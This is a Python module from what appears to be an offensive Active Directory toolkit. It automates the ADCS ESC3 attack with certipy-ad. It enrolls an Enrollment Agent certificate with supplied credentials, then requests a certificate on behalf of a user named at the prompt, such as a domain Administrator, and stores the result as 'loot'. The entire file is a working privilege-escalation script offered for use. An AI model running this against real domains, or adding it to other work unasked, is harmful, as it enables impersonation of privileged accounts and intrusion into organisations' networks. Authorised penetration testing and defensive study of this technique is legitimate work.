import os
import uuid
from core.helpers import run_command, save_loot
from core.colors import blue, green, red, yellow

def abuse_esc3(session, agent_template):
    print(blue(f"[*] Attempting ESC3 abuse using template: {agent_template}"))

    # Step 1: Enroll for an Enrollment Agent certificate
    agent_out = f"agent_cert.pfx"
    enroll_cmd = (
        f"certipy-ad req -u {session.username} -p '{session.password}' "
        f"-dc-ip {session.dc_ip} -template {agent_template} "
        f"-ca {session.adcs_metadata['cas'][0]['name']} -out {agent_out}"
    )

    print(blue(f"[*] Step 1: Requesting Enrollment Agent cert with command: {enroll_cmd}"))
    output1, err1 = run_command(enroll_cmd)
    print(output1)
    if err1:
        print(red(err1))

    if not os.path.exists(agent_out):
        print(red("[-] Enrollment Agent certificate not created."))
        return

    print(green(f"[+] Agent certificate saved to: {agent_out}"))

    # Step 2: Abuse it to request a certificate on behalf of another user
    target_user = input("[?] Enter target user to impersonate (e.g., lab\\Administrator): ").strip()
    second_out = f"esc3_onbehalf.pfx"
    abuse_cmd = (
        f"certipy-ad req -u {session.username} -p '{session.password}' "
        f"-dc-ip {session.dc_ip} -template User "
        f"-ca {session.adcs_metadata['cas'][0]['name']} "
        f"-on-behalf-of '{target_user}' -pfx {agent_out} -out {second_out}"
    )

    print(blue(f"[*] Step 2: Requesting cert on behalf of {target_user} with command: {abuse_cmd}"))
    output2, err2 = run_command(abuse_cmd)
    print(output2)
    if err2:
        print(red(err2))

    if os.path.exists(second_out):
        with open(second_out, "rb") as f:
            binary_data = f.read()
        save_loot(os.path.basename(second_out), binary_data, binary=True)
        print(green(f"[+] On-behalf-of cert saved to: {second_out}"))
    else:
        print(red("[-] On-behalf-of certificate not created."))